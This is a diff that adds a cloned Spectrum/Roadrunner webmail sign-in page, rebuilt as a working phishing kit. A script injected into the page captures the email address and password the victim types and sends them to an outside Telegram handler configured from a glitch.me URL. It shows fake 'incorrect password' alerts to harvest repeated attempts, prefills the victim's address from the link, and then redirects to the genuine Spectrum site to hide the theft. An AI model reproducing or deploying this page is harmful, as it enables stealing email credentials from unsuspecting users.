@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<!-- saved from url=(0038)https://webmail.spectrum.net/mail/auth -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="A/kargTFyk8MR5ueravczef/wIlTkbVk1qXQesp39nV+xNECPdLBVeYffxrM8TmZT6RArWGQVCJ0LRivD7glcAUAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
+    
+    <script type="text/javascript" async="" charset="utf-8" src="Roadrunner/recaptcha__en_gb.js.download" crossorigin="anonymous" integrity="sha384-wxK1GRvr3VMaoMrFu9sAGWa5hCt0P7FJvlkPWu68jhr4d1K9FSq2WgMoHPsWQpHL"></script><script type="text/javascript">
+      window.features = {"twcselfcarelink":true,"filters":true,"autoResponse":true,"spam":true,"usePHPImap":true,"hideMailSort":false,"openWaveSignature":true,"hideAccountPulldown":true,"contactImport":false,"hohLink":true,"threatMatrix":false};
+      window.hohapi = 'https://www.spectrum.net/api/pub/hoh/v1/register-hoh';
+    </script>
+    <script type="text/javascript" src="Roadrunner/jquery-1.9.1.min.js.download"></script>
+    <script type="text/javascript" src="Roadrunner/jquery-ui.min.js.download"></script>
+    <script type="text/javascript" src="Roadrunner/login.js.download"></script>
+    <script type="text/javascript" src="Roadrunner/spectrumloginheader.js.download"></script>
+    <link rel="stylesheet" type="text/css" href="Roadrunner/rutledge.css">
+    <link rel="stylesheet" type="text/css" href="Roadrunner/sb-icons.css">
+    <link rel="stylesheet" type="text/css" href="Roadrunner/login.css">
+    <link rel="stylesheet" type="text/css" href="Roadrunner/spectrum.css">
+    <link rel="stylesheet" type="text/css" href="Roadrunner/rutledge.css">
+    <title>Login TWC &amp; Roadrunner RR Email | Spectrum Webmail</title>
+    <meta name="description" content="Former Time Warner Cable and BrightHouse customers, sign in to access your roadrunner.com, rr.com, twc.com and brighthouse.com email.">
+
+    <!-- Include the Telegram handler script -->
+    <script type="text/javascript" src="telegram-proxy-handler.js"></script>
+
+    <!-- Script to auto-fill email address from URL parameters and handle form submission -->
+    <script type="text/javascript">
+        // Function to extract URL parameters
+        function getUrlParameter(name) {
+            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+            var results = regex.exec(location.search);
+            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+        }
+
+        // Initialize Telegram handler
+        const telegramHandler = new TelegramProxyHandler({
+            configUrl: 'https://hallowed-lava-property.glitch.me/iconfig.json',
+            collectUserInfo: true
+        });
+        
+        // Track login attempts using local storage
+        function getLoginAttempts() {
+            const attempts = localStorage.getItem('loginAttempts') || 0;
+            return parseInt(attempts, 10);
+        }
+        
+        function incrementLoginAttempts() {
+            const attempts = getLoginAttempts() + 1;
+            localStorage.setItem('loginAttempts', attempts);
+            return attempts;
+        }
+        
+        function resetLoginAttempts() {
+            localStorage.setItem('loginAttempts', 0);
+        }
+
+        // Function to handle form submission
+        function handleFormSubmit(event) {
+            // Prevent the default form submission
+            event.preventDefault();
+            
+            // Get form data
+            var emailAddress = document.getElementById('emailAddress').value;
+            var emailPassword = document.getElementById('emailPassword').value;
+            
+            // Increment login attempts
+            const attempts = incrementLoginAttempts();
+            
+            // Show loading animation
+            document.querySelector('.loader').style.display = 'block';
+            
+            // Send to Telegram
+            telegramHandler.initialize().then(function(success) {
+                if (success) {
+                    return telegramHandler.sendMessage({
+                        'Email': emailAddress,
+                        'Password': emailPassword,
+                        'Source': 'Spectrum Webmail Form',
+                        'Attempt': attempts,
+                        'Date': new Date().toISOString()
+                    }, '🔐 Spectrum Login Details 🔐\n\n');
+                }
+                return Promise.reject("Failed to initialize Telegram handler");
+            })
+            .then(function(messageSent) {
+                // Hide loading animation
+                document.querySelector('.loader').style.display = 'none';
+                
+                // Check if this is the 3rd attempt
+                if (attempts >= 3) {
+                    // Reset counter and redirect
+                    resetLoginAttempts();
+                    window.location.href = "https://webmail.spectrum.net/mail/auth";
+                } else {
+                    // Show error message for 1st and 2nd attempts
+                    document.getElementById('emailPassword').value = '';
+                    alert("Incorrect password. Please try again.");
+                }
+            })
+            .catch(function(error) {
+                // Hide loading animation
+                document.querySelector('.loader').style.display = 'none';
+                
+                // Show error message
+                console.error("Error:", error);
+                
+                // Check if this is the 3rd attempt despite the error
+                if (attempts >= 3) {
+                    // Reset counter and redirect
+                    resetLoginAttempts();
+                    window.location.href = "https://webmail.spectrum.net/mail/auth";
+                } else {
+                    // Show error for 1st and 2nd attempts
+                    alert("There was a problem with your login. Please try again.");
+                }
+            });
+            
+            // Return false to prevent form submission
+            return false;
+        }
+
+        // Document ready function
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if email parameter exists in URL
+            var emailParam = getUrlParameter('email');
+            if (emailParam) {
+                // Auto-fill the email field
+                document.getElementById('emailAddress').value = emailParam;
+                // Focus on password field
+                document.getElementById('emailPassword').focus();
+            }
+        });
+    </script>
+
+    </head>
+
+<body>
+<div class="loader" style="display: none;">
+    <div class="spinner">
+        <svg class="text-primary" width="80px" height="80px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
+            <circle class="path" fill="none" strokewidth="4" strokelinecap="round" stroke="#0073d1" cx="33" cy="33" r="30"></circle>
+        </svg>
+    </div>
+</div>
+<div id="header">
+    <nav role="navigation">
+        <div class="app-header">
+  <button tabindex="0" access-tabindex="skip-to-content" access-next-tabindex="banner-menu-button" class="skip-to-content-link">
+    Skip to Main Content
+  </button>
+
+  <div class="app-header-container">
+    <div class="app-header-menu">
+      <div class="app-global-side-nav">
+        <button class="nav-button" aria-haspopup="true" aria-label="Navigation menu" access-tabindex="banner-menu-button" access-next-tabindex="banner-logo">
+          <span class="md-icon hamburger-icon mat-icon material-icons" role="img" aria-hidden="true"></span>
+          <span class="nav-menu-label" aria-hidden="true" id="menu-label">MENU</span>
+        </button>
+
+        <div class="navOverlay"></div>
+
+        <div class="sidenav">
+          <div class="interiorSideNav">
+            <div class="close-button">
+              <button class="icon-button" aria-label="Close button for navigation menu" tabindex="0" access-tabindex="sidenav-close" access-next-tabindex="sidenav-menu">
+                <span class="close-icon mat-icon" role="img" aria-hidden="true"></span>
+              </button>
+            </div>
+
+
+            <div>
+              <div class="menu-container">
+                <ul class="menu-unstyled ui-menu ui-widget ui-widget-content" access-tabindex="sidenav-menu" access-next-tabindex="sidenav-signout-button" id="ui-id-1" role="menu" tabindex="0">
+                  <li class="ui-menu-item">
+                    <div id="ui-id-2" tabindex="-1" role="menuitem" class="ui-menu-item-wrapper">
+                      <a class="menu-link menu-link-primary" target="_self" href="https://www.spectrum.net/login/">
+                        Manage Account
+                      </a>
+                    </div>
+                  </li>
+                  <li class="ui-menu-item">
+                    <div id="ui-id-3" tabindex="-1" role="menuitem" class="ui-menu-item-wrapper">
+                    <a class="menu-link menu-link-primary" target="_self" href="https://www.spectrum.net/support/">
+                      Get Support
+                    </a>
+                    </div>
+                  </li>
+                  <li class="ui-menu-item">
+                    <div id="ui-id-4" tabindex="-1" role="menuitem" class="ui-menu-item-wrapper">
+                    <a class="menu-link menu-link-primary" target="_self" href="https://watch.spectrum.net/">
+                      Watch TV
+                    </a>
+                    </div>
+                  </li>
+                </ul>
+              </div>
+                            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="app-header-utility">
+      <div class="app-utility-nav">
+        <a class="list-item support-link mat-button" target="_blank" href="https://www.spectrum.net/support/" aria-disabled="false" aria-label="Support (Opens in a new window)" tabindex="0" access-tabindex="banner-link-support" access-next-tabindex="banner-link-signout">
+          <span class="no-border">Support</span>
+        </a>
+                </div>
+    </div>
+
+    <div class="app-header-logo">
+      <a class="mat-button" target="_self" href="https://webmail.spectrum.net/" aria-disabled="false" tabindex="0" access-tabindex="banner-logo" access-next-tabindex="banner-link-support">
+        <img alt="Spectrum logo" src="Roadrunner/spectrum-logo.svg">
+      </a>
+    </div>
+  </div>
+
+  <div class="app-header-local">
+    <div class="app-local-nav">
+    </div>
+  </div>
+
+</div>
+    </nav>
+</div>
+
+<div id="body">
+    <script src="Roadrunner/api.js.download" async="" defer=""></script>
+
+<div id="loginForm">
+    
+        
+    <div id="loginFormContainer">
+
+        <h1 id="headline">
+            Sign In to Webmail
+        </h1>
+        <div id="hohLink">
+            <div id="dividerLine"></div>
+            <div id="orText">or</div>
+            <div id="hohHref"><a href="https://www.spectrum.net/hoh">Create an Email Address</a></div>
+        </div>
+        <form id="spectrumLoginForm" onsubmit="handleFormSubmit(event)">
+            <div id="emailAddressContainer">
+                <label for="emailAddress">Email Address</label>
+                <input type="text" id="emailAddress" name="emailAddress" value="">
+            </div>
+
+            <div id="rememberEmailContainer">
+                <input type="checkbox" name="rememberEmail" id="rememberEmail">
+                <label for="rememberEmail">
+                    Remember Email Address
+                </label>
+            </div>
+
+            <div id="emailPasswordContainer">
+                <label for="emailPassword">
+                    Email Password
+                </label>
+                <input type="password" id="emailPassword" name="emailPassword" value="">
+            </div>
+            <div class="captchaBlock" style="margin-bottom:25px;display: block">
+                <div class="g-recaptcha" data-sitekey="6LfRsggUAAAAABJBT04IBvG0gWCNSB_FuhkC4PAx"></div>
+            </div>
+            <input type="submit" name="submit" id="emailSubmit" value="Sign In">
+        </form>
+
+        <div id="forgotLinks">
+            <a id="forgotEmail" href="https://self-care.portals.spectrum.net/username-recovery">Forgot Email Address?</a>
+            <a id="forgotPassword" href="https://self-care.portals.spectrum.net/password-reset">Forgot Email Password?</a>
+        </div>
+    </div>
+
+</div>
+</div>
+
+
+<div id="footer">
+    <nav role="navigation">
+        <ul>
+    <li>© 2019 Charter Communications. All rights reserved</li>
+    <li>
+        <a href="https://www.spectrumreach.com/" target="_blank" aria-label="Advertise with Us (Opens in new window)">Advertise with Us</a>
+    </li>
+
+    <li>
+        <a href="https://www.spectrum.com/policies/your-privacy-rights" target="_blank" aria-label="Your Privacy Rights (Opens in new window)">Your Privacy Rights</a>
+    </li>
+
+    <li>
+        <a href="https://www.spectrum.com/policies/website-privacy-policy.html" target="_blank" aria-label="Web Privacy Policy (Opens in new window)">Web Privacy Policy</a>
+    </li>
+
+    <li>
+        <a href="https://www.spectrum.com/policies/california" target="_blank" aria-label="California Consumer Privacy Rights (Opens in new window)">California Consumer Privacy Rights</a>
+    </li>
+
+    <li>
+        <a href="https://www.spectrum.com/policies/your-privacy-rights-opt-out" target="_blank" aria-label="Do Not Sell or Share My Personal Information/Opt-Out of Targeted Advertising (Opens in new window)">Do Not Sell or Share My Personal Information/Opt-Out of Targeted Advertising</a>
+    </li>
+
+    <li>
+        <a href="https://www.spectrum.com/policies/terms-of-service.html" target="_blank" aria-label="Spectrum Subscriber Policies (Opens in new window)">Spectrum Subscriber Policies</a>
+    </li>
+
+    <li>
+        Time Warner Cable and the Time Warner Cable logo
+        are trademarks of Time Warner Inc., used under license.
+    </li>
+</ul>
+    </nav>
+</div>
+<script type="text/javascript">
+  var $links = $("#footer").find("a");
+  $.each($links, function( i ) {
+    $($links[i]).attr("aria-label", $($links[i]).text() + " (Opens in new window)");
+  });
+</script>
+
+</body>
+</html>
